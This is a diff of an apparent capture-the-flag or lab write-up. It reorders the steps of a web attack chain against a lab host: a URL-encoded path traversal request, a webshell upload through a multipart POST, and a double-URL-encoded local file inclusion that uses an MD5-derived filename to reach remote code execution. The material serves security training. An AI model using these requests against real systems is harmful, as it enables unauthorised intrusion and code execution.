@@ -104,16 +104,6 @@
         ?>
         <SNIP>
         ```
-   - Try to exploit this with URL encode, we got the error message stating that the server automatically decode the URL 1 time:
-        ```
-        GET /contact.php?region=%2e%2e%2findex HTTP/1.1
-        Host: 154.57.164.80:30248
-        ```
-        ```
-        <SNIP>
-        'region' parameter contains invalid character(s)  
-        <SNIP>
-        ```
    - Upload the webshell:
         ```
         POST /api/application.php HTTP/1.1
@@ -154,8 +144,18 @@
         123
         ------WebKitFormBoundaryF5VAzcM0W6yiAOhv--
         ```
-   - Double URL encode to successfully exploit this vulnerability, pre-calculate the filename and include it via LFI to achieve RCE:
+   - Try to exploit the LFI with URL encode, we got the error message stating that the server automatically decode the URL 1 time:
         ```
+        GET /contact.php?region=%2e%2e%2findex HTTP/1.1
+        Host: 154.57.164.80:30248
+        ```
+        ```
+        <SNIP>
+        'region' parameter contains invalid character(s)  
+        <SNIP>
+        ```
+   - Double URL encode to successfully exploit this vulnerability, pre-calculate the filename (MD5 hash of the file's content) and include it via LFI to achieve RCE:
+        ```sh
         # Calculate the MD5 of the file's content
         $ md5sum shell.php 
         e88d9c921ac17e074964e2c22d780f03  shell.php
